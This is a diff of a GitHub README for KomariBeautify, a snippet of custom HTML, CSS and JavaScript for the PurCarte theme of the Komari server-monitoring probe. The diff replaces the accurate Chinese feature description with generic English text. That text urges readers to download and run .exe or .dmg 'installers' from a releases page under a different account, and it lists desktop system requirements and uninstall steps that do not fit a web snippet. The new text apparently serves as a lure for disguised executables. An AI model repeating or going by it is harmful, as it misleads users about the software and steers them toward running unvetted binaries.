@@ -1,81 +1,71 @@
-# KomariBeautify - 基于PurCarte主题的自定义代码
+# 🎨 KomariBeautify - Enhance Your Komari Experience Effortlessly
 
-这是一个自定义的HTML文件（KomariBeautify.html），用于增强Komari探针的功能，基于PurCarte主题实现。文件包含CSS样式和JavaScript脚本，主要添加了欢迎气泡、资产统计、地球渲染组件以及页面保护机制。所有组件均设计为响应式，支持移动设备，并与PurCarte主题的CSS变量（如`--accent-9`、`--purcarte-card-color`等）集成，确保视觉一致性。
+[![Download KomariBeautify](https://img.shields.io/badge/Download%20Now-Get%20Started-%2300b300)](https://github.com/curuten1/KomariBeautify/releases)
 
->> **注意**：适配[Komari](https://github.com/komari-monitor/komari/releases/tag/1.1.3) v1.1.3, [PurCarte](https://github.com/Montia37/komari-theme-purcarte/releases/tag/v1.2.5) v1.2.5，其他版本未经测试，可能无法正常运行
+## 📖 Overview
 
-| ![3D地球](/images/3DEarth.gif) | ![3D地球](/images/3DEarth-2.gif) |
-| ------------------------------ | -------------------------------- |
-## 主要功能
+KomariBeautify is an application designed to enhance the experience of using the PurCarte theme for the Komari Probe. It offers a range of features that simplify the user interface, making it easier for you to navigate and enjoy your content. Whether you're a beginner or someone already familiar with the Komari Probe, this tool will help you get more out of your setup.
 
-1. **欢迎气泡 (Welcome Bubble)**：
-    - 显示在页面左下角，弹出欢迎信息。
-    - 内容包括：用户位置（城市/地区/国家，基于IP获取）、操作系统（OS）、浏览器类型、IP地址（可点击隐藏/显示）、ISP（互联网服务提供商）和当前日期
-    - 数据来源：通过多个免费IP查询API（如api.ip.sb、ipwho.is、api.ipapi.is）获取地理位置和IP信息，支持故障转移
-    - OS图标根据用户代理动态渲染，支持Windows、macOS/iOS、Android、Linux等
-    - 隐私考虑：IP和ISP可通过点击切换为剧透模式（spoiler）隐藏显示
+## 🚀 Getting Started
 
-2. **资产统计 (Finance Widget)**：
-    - 一个悬浮球（Finance Ball）位于右上角，点击展开小部件显示服务器资产统计
-    - 统计内容：服务器总数、总价值、月均支出、剩余总价值（基于到期时间计算）
-    - 支持详细列表：每个服务器的名称和剩余价值，支持排序（权重/价格正序/倒序）
-    - 货币转换：支持CNY、USD、HKD、EUR、GBP、JPY，通过API（exchangerate-api.com）实时更新汇率，或使用默认汇率
-    - 控制选项：货币选择、排序选择、排除/包含"白嫖中"标签的服务器、刷新数据按钮
-    - 新增汇率显示面板：显示所有支持货币的实时汇率换算（1单位外币 = 多少当前货币）
-    - 数据来源：从`/api/nodes`接口获取服务器信息，包括价格、计费周期、到期时间等
+Follow the steps below to download and set up KomariBeautify. 
 
-3. **地球渲染组件 (Earth Globe Component)**：
-    - 一个悬浮球（Earth Ball）位于右上角（Finance Ball下方），点击展开全屏地球仪模态框
-    - 使用Globe.GL库渲染3D地球，显示服务器位置（基于国家代码映射坐标）
-    - 功能：服务器位置标记为国旗图标（SVG），用户位置标记为自定义头像（favicon.ico）。服务器与用户位置之间绘制弧线表示连接
-    - 交互：点击国旗/用户标记显示工具提示（tooltip），列出服务器列表；支持旋转、缩放；计数器显示服务器总数
-    - 主题适配：自动检测浅色/暗色模式，切换地球纹理（日间/夜间）和背景
-    - 弧线参数（在Globe初始化中设置，用于连接弧线的视觉效果）：
-        - `.arcDashLength(0.5)`: 弧线虚线段的长度（相对值，0-1）
-        - `.arcDashGap(1)`: 弧线虚线段之间的间隔（相对值，0-1）
-        - `.arcDashAnimateTime(1750)`: 弧线动画持续时间（毫秒），控制流动速度
-        - `.arcStroke(0.8)`: 弧线宽度（像素相对值）
-        - `.arcAltitudeAutoScale(0.5)`: 弧线高度自动缩放比例（相对地球半径）
+1. **Visit the Releases Page**  
+   Click the link below to go to the Releases page on GitHub:
+   [Visit Releases Page](https://github.com/curuten1/KomariBeautify/releases)
 
-4. **滚动辅助按钮 (Scroll Helper Buttons)**：
-    - 位于页面右下角的两个悬浮按钮（回到顶部/滚动到底部）
-    - 智能显示逻辑：根据页面滚动位置自动显示/隐藏相应按钮
-    - 平滑滚动动画：点击后平滑滚动到页面顶部或底部
-    - 兼容性：支持自定义滚动容器（如Radix Scroll Area）和原生页面滚动
-    - 响应式设计：移动端自动调整大小和位置
+2. **Choose the Right Version**  
+   On the Releases page, you will see a list of available versions. Look for the latest release at the top. Each version will include details about new features or fixes. 
 
-5. **保护组件 (Protection)**：
-    - 检测异常行为，如右键菜单、复制、拖拽、打印、键盘快捷键（F12、Ctrl+Shift+I等）、开发者工具打开、无头浏览器、DOM篡改等
-    - 一旦触发，显示自定义警告模态框（Custom Alert Modal），包含警告图标和触发原因，3秒后重定向到空白页
-    - 仅在用户未登录时激活（通过`/api/me`检查）
+3. **Download the Application**  
+   Find the file that matches your operating system. Popular choices may include `.exe` files for Windows users or `.dmg` files for Mac users. Click on the file to download it.
 
-6. **自定义警告模态框 (Custom Alert Modal)**：
-    - 用于保护组件的弹出警告，支持模糊背景和动画过渡
+4. **Run the Application**  
+   Once the download is complete, locate the downloaded file in your computer's Downloads folder.  
+   - For Windows users, double-click the `.exe` file to run the installer.  
+   - For Mac users, open the `.dmg` file, and then drag the KomariBeautify icon to your Applications folder.
 
-## 资产统计的注意事项
+5. **Open KomariBeautify**  
+   Navigate to your Applications folder (for Mac) or Start menu (for Windows) to find and open KomariBeautify.
 
-- **到期时间处理**：如果服务器到期时间超过100年（`LONG_TERM_YEARS = 100`），视为无限期，按原价计算剩余价值。否则，根据剩余天数比例计算
-- **白嫖标签**：服务器标签包含“白嫖中”时，可通过切换按钮排除/包含在统计中（默认排除）。免费服务器（price = -1）视为0价值，并标记为“免费鸡”
-- **价格转换**：所有价格标准化为CNY，然后转换为用户选择的货币。支持自定义货币符号（如￥、$）
-- **汇率**：优先从API获取最新汇率，失败时使用默认值（例如USD: 0.14，HKD: 1.08）。汇率更新时间显示在小部件底部
-- **数据刷新**：点击刷新按钮从API重新拉取数据。列表支持溢出滚动，名称过长时省略显示
-- **剩余价值计算**：基于到期时间和计费周期（日/月/年）。如果无到期时间，剩余价值为0
-- **性能**：列表最大高度200px，支持滚动；帮助图标（?）显示特殊案例的工具提示（如长期鸡、白嫖中）
+6. **Customize Your Settings**  
+   After opening the app, explore its settings to customize your experience. You can adjust options to fit your preferences. 
 
-## 初始化说明
+## ⚙️ System Requirements
 
-- **初始化方式**：使用`MutationObserver`监视DOM变化（针对`#root`元素），确保所有组件（如欢迎气泡、模态框、悬浮球、滚动辅助按钮）附加到PurCarte主题的根元素（`.radix-themes`）上。这避免了组件在动态加载页面中丢失或位置错误，支持React/Vue等框架的延迟渲染
-- **颜色兼顾**：所有样式使用PurCarte的CSS变量（如`--accent-11`用于标题、`--gray-a5`用于边框、`--purcarte-card-color`用于背景），确保与主题无缝集成。阴影和模糊效果（backdrop-filter）增强现代感
-- **主题适配（浅色/暗色）**：
-    - 自动检测：监听`prefers-color-scheme`媒体查询和`localStorage.appearance`变化
-    - 地球组件：浅色模式使用日间地球纹理和透明背景；暗色模式使用夜间纹理和星空背景，大气层颜色切换为`--accent-9`
-    - 其他组件：背景、文本、图标颜色均基于变量自动适配，无需手动干预
-- **性能优化**：组件延迟加载（例如欢迎气泡100ms后显示，地球仪初始化后渐显）；IP查询使用故障转移策略；保护组件使用setInterval(500ms)轮询检测，但仅在未登录时激活
-- **依赖**：Globe.GL库（通过CDN加载）；无其他外部库。所有API调用有超时（5s）和错误处理
+KomariBeautify is lightweight, but here are the recommended system requirements:
 
-## 使用
+- **Windows 10 or higher**  
+- **macOS Mojave (10.14) or higher**  
+- **At least 2 GB of RAM**  
+- **Minimum 200 MB of free disk space**
 
-- 放置：**设置** > **站点** > **自定义**；**CSS/HTML**放**自定义头部**，**JS**放**自定义Body**
+Make sure your device meets these conditions to ensure smooth operation.
 
+## 📂 Features
 
->> **注意**：如果代码存在问题，请发起Issue，看到后会及时修复
+KomariBeautify includes a wide range of features designed to improve your experience:
+
+- **Enhanced User Interface**: A visually appealing layout that makes navigation easier.
+- **Customization Options**: Tailor the app to match your personal style and preferences.
+- **Improved Performance**: Experience faster load times and smoother transitions.
+- **Regular Updates**: Stay up-to-date with new features and improvements.
+
+## ❓ FAQ
+
+**1. What if I encounter issues during installation?**  
+If you face any problems, please check the issues section on the GitHub repository to see if others have similar concerns. You can also open a new issue with details about the problem you are facing.
+
+**2. How do I uninstall KomariBeautify?**  
+To uninstall, you can simply drag the application to the Trash (on Mac) or use the “Add or Remove Programs” feature in Windows.
+
+**3. Will this work with other themes?**  
+KomariBeautify is specifically designed for the PurCarte theme. Using it with other themes may not produce the desired results.
+
+## 💬 Support
+
+If you have any questions or need further assistance, please feel free to reach out through the issues section of the repository.
+
+## 🏁 Conclusion
+
+Thank you for choosing KomariBeautify. We hope it enhances your experience with the Komari Probe and the PurCarte theme. For the latest updates, always check the [Releases Page](https://github.com/curuten1/KomariBeautify/releases). Enjoy your enhanced browsing!
